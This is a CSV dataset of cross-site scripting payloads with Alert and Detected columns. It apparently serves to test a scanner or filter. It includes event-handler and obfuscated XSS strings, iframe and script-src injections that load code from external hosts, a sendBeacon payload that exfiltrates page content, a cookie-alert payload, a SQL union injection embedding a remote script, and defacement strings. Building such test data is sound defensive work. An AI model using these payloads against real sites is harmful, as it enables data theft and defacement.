Payload,Alert,Detected
onpointerdown,False,0
_url=http://www.google.com,False,0
"threadprefix=""></a><marquee>testicles</marquee>",False,0
indate=20100409,False,0
<svg/onload=self[`aler`%2b`t`]`AnonKryptiQuz`>,False,0
pf='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cm<br/>arquee%3EWhiteHat%20Forever%3C/marque%3E&s='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarq<br/>uee%3EWhiteHat%20Forever%3C/marque%3E&cat='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarqu<br/>ee%3EWhiteHat%20Forever%3C/marque%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=co<br/>m_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://xs<br/>sed.com,False,0
q=%22%3E%3Cmarquee%3EXSSed_bY_SaMTHG%3C/marquee%3E%3C/font%3E&search<br/>_button.x=0&search_button.y=0&site=casey&as_sitesearch=&num=15&filter=0,False,0
ID=http://google.com,False,0
start=http://www.xssed.com,False,0
hop=h,False,0
s=e0964f229b77777938db3203ca3150c1,False,0
"<style>:target {transform: rotate(180deg);}</style><q id=x style=""transition:transform 2s"" ontransitionrun=print()></q>",False,0
\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff07\uff58\uff53\uff53\uff07\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e,False,0
Idx=337863&IdxSeccion=0=%22%3E%3Ciframe%20src=http://www.googl<br/>e.com/%3E%3C/iframe%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
rdurl=http://www.owasp.org/index.php/Open_redirect,False,0
option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&tas<br/>k=vote&pop=0&Itemid=10&cid=1&url=%0AContent-Type:%20text/html%0AContent-Length:16%0A%0Ayou%20are%20s<br/>o%20owned,False,0
cargarnoticia=true&seccion=3&tit=%3Ciframe%20src=%22http<br/>://xssed.com%22%3E,False,0
lang=en&eventId=rg&loc=en_FR%22%3E%3Cifram<br/>e%20src=%22http://www.xssed.com%22%3E&query=%22%3E%3Ciframe%20src=%22http://www.xssed.com%22%3E,False,0
"type_transac=V&APP=&MAI=&cp1='""><marquee>XSS+by+SylTroX<iframe+<br/>src%3D'http%3A%2F%2Fxssed.com'%2F>&budget_mini=&budget_maxi=&pieces_min=&pieces_max=&surface_mini=&s<br/>urface_maxi=&lancer=Lancer+la+recherche",False,0
U=http://xssed.com,False,0
"idProducto=""><iframe%20src=http://xssed.com>",False,0
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=print()></sup>",False,0
"recherche=1<iframe src=""http://xssed.com"">",False,0
l=es&t=do_po2,False,0
"""></video>",False,0
main.search=%3Ch1%3E%3Cmarquee%3EXSSed_by_Uber0n,False,0
shopName=%27%3E%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fku<br/>somiso.com%2F&x=5&y=7,False,0
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;,False,0
fuseaction=blog.ListAll&friendID=450937221,False,0
pagina=<center><font size=24>Hotpockets Wubs XSS<br/>^_^</size></center>,False,0
"<Input value = """" type = text>",False,0
"<polygon id=""lightning"" points=""0,100 50,25 50,75 100,0"" fill=""#ff1919"" stroke=""#ff0000""/>",False,0
onSelectStart,False,0
pagina=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=print()></menuitem>",False,0
sp_url=http://xssed.com,False,0
palabras=%22%3E%3Ch1%3EXss%20by%20n0b0dy%3C%2Fh<br/>1%3E&=Buscar+%3E%3E,False,0
"1'""><img/src/onerror=.1|alert``>",False,0
municipio=%22%3E'%3E%3C<br/>SCRIPT%20SRC=http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,False,0
"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;XSS&lt;/A&gt;",False,0
"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=print()></mark>",False,0
display_name=%22%3E%3Ciframe%20src=http://xssed.c<br/>om%3E&horse_name=SAMBIAGOMAN&racing_name=',False,0
<svg/onload​=alert//&NewLine;(2)>,False,0
categoria=%3E%22%3Ciframe%20src=%22htt<br/>p://www.google.it/%22%3E,False,0
"""http://www.google.com./"">xss</a>",False,0
id=70&identificaArticulo=26=%22%3E%3Ch1%3EExpl<br/>oit%20Some%20XSS%3C/h1%3E'%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
method=doListSoftware&id=1&flay=find&softwar<br/>eName=<iframe+src=http://www.google.com></iframe>,False,0
imgurl=Redirect_By_RedTuning&imgrefurl=http://elredtuning.altervista<br/>.org&h=0&w=0&sz=0&tbnid=o78WRIXSFwEmKM:&tbnh=0&tbnw=0&prev=&start=1&ei=5WruR7f6OIv6-QKR8KgW&sig2=HHg<br/>kU9dTcoljTKv_6Uo-Sg&sa=X&oi=images&ct=image&cd=1,False,0
memberurl=,False,0
"<EMBEDSRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==""type=""image/svg+xml""AllowScriptAccess=""always""></EMBED>",False,0
Art=<center><h1>HACKED BY SYST3M CR4SH XSS<br/>ATTACK</h1></center>,False,0
Keywords=%22%3E%3Ciframe%20src%3Dhttp://www.baseportal.<br/>com/baseportal/bankphish/_XSS%3E%3C/iframe%3E&Submit=Search,False,0
menu=modules&location=%22%3E%3Cmarquee%3E%3Ch1%3E<br/>Defaced%20by%20ironzorg%3C/h1%3E%3C/marquee%3E,False,0
Pid='%22%3E%3Ciframe%20src=http:<br/>//pc-kopat.us/hacked/%3E,False,0
fuseaction=comedianJoin.step1verify,False,0
"CatalogID=&action=reviewCart&user=&orderNumb<br/>er=';//\';//""//\""//--></SCRIPT>"">'><IFRAME SRC=http://xss.exofire.net/x/ WIDTH=1024 HEIGHT=860>",False,0
"<A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>",False,0
f=SuzieCarina_w102aV&ccid=%22%3E%3Ciframe%20src=http://hypnozha<br/>ck.org/hacked/%3E,False,0
fields=recordationNumber&data=%22%3E%3Ciframe%20<br/>src%3Dhttp://www.baseportal.com/baseportal/bankphish/_XSS%3E%3C/iframe%3E,False,0
configType=BBCOM_SIMPLEDEFAULT&pubList=Billb<br/>oard&an=bbcom&action=Submit&kw=&exposeNavigation=true&keyword=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNE<br/>T+SECURITY+BY+CHEROKEE+WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3E&submit.x=0&submit.y=0&submit=Submit&search<br/>Type=ARTICLE_SEARCH,False,0
"<style>:target {color: red;}</style><xmp id=x style=""transition:color 10s"" ontransitioncancel=print()></xmp>",False,0
code=%22%3E%3Ciframe%20src=/%3E%3C/iframe%3E,False,0
PostID=597397&Site<br/>ID=1,False,0
"""%3balert`AnonKryptiQuz`%3b""",False,0
"<br/>pt=2&sp=2&ycs=%2BqWEgB7wUAc%3D&qs=06oENya4ZGJbKUjvjwGtnG6lv5PUHv7-DCS8GOtXd1my1tBRRnGa1OdmVBbG7ZE7gT<br/>ShWmQTugFi0FaEFoecugr9h7XMX3sQKX9d5gEKcfFvXPI7ND8eVl0Lxej_MdsCxKeqDZfaAH67akkIXH1170-Y93dxb87pKucLVc<br/>1VFrpCvJeFQ-GWJhQUv5R0q5zGfjJ1JZSYrW5-Xt4PlncJhykluRJgNfbxqcgdhQFJf8xnHCyCcXneopQHunfVdTSPUgTysAsU_e<br/>4E-vSZQBm0y3xXv1b63E425JAHtO-ixmeKOgzAvuQpAj,YT0z&vid=1205498170_2X03X786444015&rpt=2&kt=1",False,0
p_p_id=2&p_p_action=1&p_p_state=maximized&p_p_mode=view&p_p_<br/>col_id=&p_p_col_pos=0&p_p_col_count=0&_2_struts_action=%2Fmy_account%2Fsign-up,False,0
q=%22%3E%3Cimg+src%3Dhttp%3A%2F%2Fi48.tinypic.com%2Fdw5dkz.<br/>png%3E%3C%2Fimg%3E%3C%22,False,0
"ID=779""<iframe/src=""http://xssed.com"">",False,0
"<style>:target {transform: rotate(180deg);}</style><rt id=x style=""transition:transform 2s"" ontransitionrun=print()></rt>",False,0
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=print()></iframe>",False,0
onDrag,False,0
"<;A HREF="";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"";>;XSS<;/A>;",False,0
"DocType=App+Note&Query_Type=99&keyword=""><iframe<br/>src=""http://xssed.com"">",False,0
lan<br/>g=de&direction=WB&airport=%22%3E%3C%3Ciframe%20src=http://xssed.com%20%3C,False,0
side=99&sti=%22%3E%3Ch1%3EHacked%20By%20Dialogitec%20ImeCiQ%3C/h1%3E,False,0
id_prd=4&id_cnt=999&id_por=5&url=http://xssed.com/,False,0
"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=print()></td>",False,0
1=1,False,0
tag=%3Ciframe%20src=http://www.google.com%3E%3C/iframe%3E,False,0
show_id=45727&link_type=archive_downloads&link=http://www<br/>.xssed.com,False,0
busca=%22/%3E%3Ciframe+src%3D%22http://xssed.com%22%3E&x=39&y=8,False,0
url=xssed.com,False,0
oaparams=2__bannerid=3858__zoneid=105__cb=0a791e8a0f__max<br/>dest=http://xssed.com,False,0
srch=%22%3E%3Ch1%3EXss-n0b0dy%3C%2Fh1%3E&s=Buscar,False,0
"parseInt(""prompt"",36);",False,0
searchString=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E&x=0&y=<br/>0,False,0
"Adcode=DOMAINSEARCHREG&DomainName=kusomiso.com/""><<br/>SCRIPT/SRC=http://z.la/vg4ov></SCRIPT>&TLDs=ac",False,0
t=p&d=synus&s=iso&c=i0&l=dir&o=0&sv=0a30058a&ip=5b8ccbdb&id=ED98500CF5DB9085B6<br/>092BC6197BA3B2&q=ASAP+Utilities&p=1&qs=121&ac=30&g=39d5E2cam5CEXq&en=gg&io=0&b=spl&tp=d&ec=2&pt=SAP+<br/>MENA&ex=sgcl%3D0165Bx-Qf7hfWhX-C8%26sgch%3D&url=&u=http://www.r3t.n3t.nl/aclk?sa=L&ai=BkpWojp5JSJHMK<br/>Y6Oep3vraoN48vYYdW8jYsGs7jBDPDfQxABGAEg2Zz6BSgCOAFQ9tb20f7_____AWCf0-oEsgELaXNvaHVudC5jb23IAQHaAQtpc<br/>29odW50LmNvbakCNDWDZTZFkj7ZA7UytMv6m_6f4AMQ&num=1&sig=AGiWqtzrPmE_h_e_4uuQ6mz75DrrcYBWyg&q=http://ww<br/>w.r3t.n3t.nl/mk/get/MENA_08_MEGA_T1_CP%3FURL_ID%3DS001,False,0
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=print()></bdi>",False,0
onkeydown,False,0
mot=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg<br/>%3C/h1%3E%3C/marquee%3E,False,0
Forum=2&Topic=8&srow=11&erow=20,False,0
page=login&uri=index.php?page=%22%3E%3Ch1%3EDarkMindZ.com,False,0
"ID=01.18.02&ix=home**<iframe src=""http://xssed.com"">**",False,0
&x=32584155495073624d30553d&z=674a5a425331493d,False,0
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=print()></plaintext>",False,0
website=ezhome--srtp&eventcd=searchtips&key=</title><iframe%20sr<br/>c=http://www.yahoo.com></iframe>&t=0,False,0
login_error=PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==,False,0
login=%22%3E%3Ciframe%20src=http://hypnozhack.org/hacked/%3E,False,0
"<div id=""113""><div id=""x"">XXX</div>",False,0
page=lostPassword,False,0
message=%3Cp%3E%3Cimg%20border=%220%22%20src=%22http://ima<br/>ges.starpulse.com/Photos/Previews/Amityville-Horror-mv12.jpg%22%20width=%22445%22%20height=%22288%22<br/>%3E%3C/p%3E%3Cp%3E%3Cfont%20size=%227%22%3EHACKING-GURUS.C0M%3C/font%3E%3C/p%3E,False,0
<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>,False,0
""";a=prompt,a(1)//",False,0
"<style>:target {transform: rotate(180deg);}</style><custom tags id=x style=""transition:transform 2s"" ontransitionrun=print()></custom tags>",False,0
option=com_content&user_rating=1&submit_vote=1&task=v<br/>ote&pop=0&Itemid=10&cid=1&url=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
page=%20%3Cmarquee%3E%3Cimg%20src=%22http://i52.tinypic.com/2u4rimw.png<br/>%22%3E%3C/marquee%3E,False,0
command=eq&attr1=sitemap+taxonomy&attr2=%3AProducts+an<br/>d+Services%3AGovernment&v0=%3Cmarquee%3E%3Ch1%3ESTITCHUP%3C%2Fh1%3E%3C%2Fmarquee%3E&i=sitemap+id&s1=<br/>sitemap+id%2F%2F1&s0=iphrase+relevance%2F%2F0&as=1&tq=1&q=10&s=238253827187&t=0&c1=t%3A0%2F%2F%3Assl<br/>%2F%2Fsitemap+taxonomy%2F%2F%3AProducts+and+Services&c0=i%3A1%3B514%3Bsitemap+content+metadata+descr<br/>iption%2Csitemap+text%2Csitemap+name%2Csitemap+taxonomy%2Csitemap+teaser%2Csitemap+content+metadata+<br/>keyword%3B%3C%2Cmarquee%2C%3E%2Ch%2C1%2CSTITCH%2CUP%3B%3A%3C%2C%3Amarqu%2C%3A%3E%2C%3Ah%2C%3A1%2C%3A<br/>stitch%2C%3Aup%3B1%2C1%2C2%2C1%2C3%2C1%2C5%2C1%2C6%2C1%2C8%2C1%2C9%2C1%3B0+1+2+3+4+5+6&render=1&doma<br/>ins=sitemap+id&datasections=Products+and+Services&text=,False,0
method_name=doSearch&group_type=punjab,False,0
q=%22%3E%3Ch1%3E%3Cmarquee+truespeed%3D%22truespeed%22%3Exss+death-<br/>angel&a=ifrance.com,False,0
"</svg>//[""'`-->]]>]</div>",False,0
"<style>:target {color: red;}</style><meta id=x style=""transition:color 10s"" ontransitioncancel=print()></meta>",False,0
frmMoteurSearch_search=%2F%22%3E%3Cs<br/>cript+type%3D%22text%2Fjavascript%22+src%3D%22http%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fc<br/>kers.org.js%22%3E%3C%2Fscript%3E,False,0
"id=""><img<br/>src=""%22%3E%3Cimg%20src=http://data.xssed.org/images/xssed_logo.gif%20/%3E"" />",False,0
"<svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",False,0
<iframe src=http://www.vulnerability-lab.com>,False,0
file=<h1>xss'd,False,0
"</doc>//[""'`-->]]>]</div>",False,0
"<style>:target {transform: rotate(180deg);}</style><rtc id=x style=""transition:transform 2s"" ontransitionrun=print()></rtc>",False,0
btnI&q=allinurl:http://www.xssed.com/,False,0
keywords=%22%20%27%3E%3Cmarquee%3Ecueballr,False,0
mot_cle=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20for%20Xs<br/>sed.com by ironzorg%3C/h1%3E%3C/marquee%3E,False,0
requete=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+<br/>by+ironzorg%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
onscrollend,False,0
onDragOver,False,0
query=%22%3E%3Ctitle%3E--%3D%5B+Skunkfoot+%7C%7C+XSS<br/>+%7C%7C+Think+Dark+%5D%3D--%3C%2Ftitle%3E%3Cp+align%3Dcenter%3E%3Ca+href%3Dhttp%3A%2F%2Fwww.darkmind<br/>z.com%3E%3Cimg+border%3D0+src%3Dhttp%3A%2F%2Fwww.darkmindz.com%2Fimg%2Fdark_pixel.jpg+width%3D700+he<br/>ight%3D240%3E%3C%2Fa%3E%3C%2Fp%3E%3Cp+align%3Dcenter%3E%3Ca+href%3Dhttp%3A%2F%2Fdarkmindz.com%2Fuser<br/>%2Fview%2FSkunkfoot%3E%3Cb%3E%3Cfont+face%3DVerdana+size%3D4%3E+--%3D%5B+Skunkfoot+%7C%7C+XSS+%7C%7C<br/>+Think+Dark+%5D%3D--+%3C%2Ffont%3E%3C%2Fb%3E%3C%2Fa%3E%3C%2Fp%3E%3Cp+align%3Dcenter%3E%3Cb%3E%3Cfont<br/>+face%3DVerdana+size%3D4%3E%3Ca+href%3Dhttp%3A%2F%2Fwww.darkmindz.com%3E%3Cfont+color%3D%23FF0000%3E<br/>--%3D%5B+Darkmindz.com+%5D%3D--%3C%2Ffont%3E%3C%2Fa%3E%3C%2Ffont%3E%3C%2Fb%3E%3C%2Fp%3E&engine=links,False,0
"<;A HREF="";http://google:ha.ckers.org"";>;XSS<;/A>;",False,0
link=%68%74%74%70%3A%2F%2F%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D,False,0
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;,False,0
id_cat=&id_subcat=&word=%3Ch1%3E+XSS+%3C%2Fh1%3E&id_cat=&search=<br/>Buscar+Avisos,False,0
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",False,0
onshow,False,0
form=presupuesto&ttl=prspt&prdct=1&nmbr=%3Cif<br/>rame%20src=http://xssed.com/%3E,False,0
word=%3Cmarquee%3E%3Ch1%3Ekaksii%20was%20here%3C<br/>/h1%3E%3C/marquee%3E%3Cdiv%20align=center%3E%20%3Cfont%20size=4%3E%3Ctextarea%20name=1%20cols=100%20<br/>rows=1000%20id=1%3Ekaksii%20was%20here%3C/textarea%3E%3C/font%3E%3C/div%3E%3Cnoscript%3E%3Cplaintext<br/>%3E,False,0
page=resultat&amp;resultat=recherche,False,0
Mode=New=%22%3E%3Ciframe%20src=http://www.google.com/%20w<br/>idth=866%20height=450%3E%3C/iframe%3E,False,0
"catid=';//\';//""//\""//--></SCRIPT>"">'><IFRAME<br/>SRC=http://xss.exofire.net/x/ WIDTH=1024 HEIGHT=860>",False,0
kw=%22%3E%3Cmarquee%3E%3Ch%31%3EThis_site_is_NOT_Hacker_<br/>Safe%3C%2Fh%31%3E%3C%2Fmarquee%3E,False,0
option=com_search&view=search,False,0
siteid=1,False,0
OpenDocument&url=http://<br/>www.xssed.com,False,0
cat=kusomiso.com&d=http://www.xssed.com,False,0
http://xssed.com/&&CP=65001&CE=nsv090310&HL=Privacy%20Online,False,0
reqtype=%3Ch1%3E%20LOLZ%20XSS%20%3Ch1%3E,False,0
mode=results,False,0
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=print()></strike>",False,0
section=search,False,0
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=print()></th>",False,0
"<div id=""137""><svg>",False,0
<!ATTLIST xsl:stylesheet,False,0
option=com_content&user_rating=1&submit_vote=index2.php<br/>?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url<br/>=http://www.xssed.com,False,0
unix_name=%22%3E%3Ciframe%20src=http://google.com%3E,False,0
Terms=%3Ch1%3E%3Cmarquee%3EXSSED_by_Uber0n<br/>%3C%2Fh1%3E&howmuch=ALL&Range=All&x=&db=,False,0
"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",False,0
&lt;? echo('&lt;SCR)';,False,0
name=%22'%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr%3C/st<br/>rong%3E%3C/h1%3E%3C/marquee%3E,False,0
id='%3E%3Ch1%3EXss%20by%20n0b0dy%3C/h1%3E,False,0
pageName='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cma<br/>rquee%3EWhiteHat%20Forever%3C/marque%3E,False,0
&#X03c;,False,0
A=2,False,0
search=%3Cp+align%3Dcenter%3E%3Cfont+color%3Dgreen%3EHacked%21%3Cmar<br/>quee%3E%3C%2Ffont%3E%3Cplaintext%3E,False,0
id=108%3Ciframe%20src=,False,0
target=http://uber0n.darkillusion.org/xsspage.htm,False,0
searchStr=%22%3E%27%3Ciframe+src%3Dhttp%3A%2F%2Fkusomiso.com%2Fxs<br/>s.html+%3C&searchType=&pid=430&imageField.x=0&imageField.y=0,False,0
"<style>:target {transform: rotate(180deg);}</style><center id=x style=""transition:transform 2s"" ontransitionrun=print()></center>",False,0
s=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E&submit=Buscar,False,0
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=print()></colgroup>",False,0
"<style>:target {color: red;}</style><video2 id=x style=""transition:color 10s"" ontransitioncancel=print()></video2>",False,0
start=0,False,0
s3q=%22%2F%3E%3Cmarquee%3E%3Ch1%3EXSSed+by+fallin<br/>gmidget%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
<x onxxx%3D1,False,0
-Search=fsearch&-database=Services&-Table<br/>=islamicglossary&-noresultserror=searchglossary.asp&-Response=searchglossary.asp&-MaxRecords=10&-Sor<br/>tField=Term&-SortOrder=Ascending&-op=cn&fsearch=%3Ccenter%3E%3Ch1%3Eap101%3C%2Fh1%3E%3Cbr%3E%3Cbr%3E<br/>%3Ciframe+src%3D%22http%3A%2F%2Fwww.google.com%22+%2F%3E&-search.x=&-search.y=,False,0
search_text=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20iron<br/>zorg%3C/h1%3E%3C/marquee%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><noembed id=x style=""transition:transform 2s"" ontransitionrun=print()></noembed>",False,0
to_url=http://rstzone.org,False,0
"id=-9999999+union+all+select+1,2,0x3c736372697074207372<br/>633d22687474703a2f2f66726565776562732e636f6d2f736b756e6b663030742f582e6a73223e3c2f7363726970743e",False,0
<marquee loop=1 width=0 onfinish=alert`AnonKryptiQuz`>AnonKryptiQuz</marquee>,False,0
"<div id=""123""><span class=foo>Some text</span>",False,0
"id=434""><iframe/src=http://xssed.com>",False,0
<h1>INJECTX</h1>,False,0
q='%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3E%3Ci%3Ecueballr<br/>%3C/i%3E%3C/strong%3E%3C/h1%3E%3C/marquee%3E,False,0
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;,False,0
\x3c,False,0
p_texto=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL<br/>%3C/marquee%3E,False,0
"search=1&MT=""><img%20src=""http://img251.imageshack.us/img251/9587/tu<br/>rk1mf6.gif"">",False,0
"bannerID=%22%3E%3Cmarquee%3E%3Ch<br/>1%3ESo%20long,%20Zango...it%27s%20been%20real.%3C/h1%3E%3C/marquee%3E",False,0
group=titlescriptalertdocumentcookiescript&type=file&url=XSSED<br/>&_done=%2Fgroup%2Ftitlescriptalertdocumentcookiescript%2Ffiles%3F&,False,0
loginuser=123@bamtri.com&err=1&sid=301664703e90f99611&tid<br/>=0&lid=5&retid=30166=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.<br/>google.com/%3E%3C/iframe%3E,False,0
onpointerup,False,0
"throw/**/Uncaught=window.onerror=eval,&quot;;alert\5023\51&quot;",False,0
p=R&srid=S2-2&lbc=food&w=xss&url=http://xssed.com&rk=1&uid=824974<br/>24&sid=2&ts=v2&rsc=5daVRl-5eq5IMwLE&method=or&parentpdf=mt_parentpdf_5b690a52e204b9ce18de975d169e2be<br/>d,False,0
URL=http://xssed.com,False,0
pg='%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
"<style>:target {color: red;}</style><datalist id=x style=""transition:color 10s"" ontransitioncancel=print()></datalist>",False,0
"<style>:target {color: red;}</style><svg id=x style=""transition:color 10s"" ontransitioncancel=print()></svg>",False,0
"<?xml-stylesheet type=""text/xml"" href=""#stylesheet""?>",False,0
d=PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg///s/Njdx/m/YWxyZWFk<br/>eQ/0==,False,0
page=companies&id=1446&name=%22%3E%3Ciframe%20src=http:<br/>//imhatimi.org/%3E,False,0
onUnload,False,0
doc=program%2Fsearch.php&srch_rows=5&srch_comment=1&srch_days=<br/>0&sselect=wr_subject%7Cwr_content&stext=%22%3E%27%3Ciframe+src%3Dhttp%3A%2F%2Fkusomiso.com%2Fxss.htm<br/>l+%3C&soperator=0,False,0
"id=%22%3E%3Ciframe%20src=http://www.google.com%3E%3C/iframe%3E=""<br/>>",False,0
q=%22%3E%3Ciframe%20src=http://www.visa.com%3E,False,0
t=c&mid=103206&uid=63100299&&&http://uber0n.darkillusion.org/xsspage.htm,False,0
fileurl=http://xssed.com,False,0
tag=ex.cn.2253447.intl.sil&destUrl=http%3A%2F%2Fwww%2Exssed%2Ecom,False,0
<body>Hello</body>,False,0
onmozfullscreenchange,False,0
"<img id=xss src='vbscript:msgbox(""xss"")'>",False,0
soksvar=visa,False,0
<svg/onload=%26nbsp;alert`bohdan`+,False,0
"<span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",False,0
"lang=en""><iframe/src=""http://xssed.com"">&origin=MOW",False,0
title=horgullo+gay&min=Desde&max=Hasta&tip<br/>o=articulos&group_nid=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
U=http://www.disney.com,False,0
redirect&target=http://xssed.com&tid=to8KMYmEL6Wlrr0&qid=qUyhr<br/>Iz2wjLl4&vid=vkcJstPcD195P&qtid=qUyhrIz2wjLl4&feature=sitemap+url,False,0
type=url&bbid=bb475&url=http://r3t.n3t.nl,False,0
<h1><font color=blue>hellox worldss</h1>,False,0
option=com_content&user_rating=1&submit_vote=index2.php?<br/>option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=<br/>http://www.xssed.com,False,0
action=logout&redirect_to=http://xssed.com,False,0
<s%08c%08r%08i%08p%08t>al%08ert%08()<%08/%08s%08c%08r%08i%08p%08t%08>,False,0
domain=%3CBIG%3E%3Ch1%3EJust%20cross%20the%20line...XSS%3C/h1%3E%3C<br/>/BIG%3E,False,0
url=http://xssed.com,False,0
<svg/onload=location=/javas/.source%2B/cript:/.source%2B,False,0
"SearchText=""><iframe src=""http://xssed.com"">",False,0
&lt;,False,0
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=print()></bdo>",False,0
onfocusout,False,0
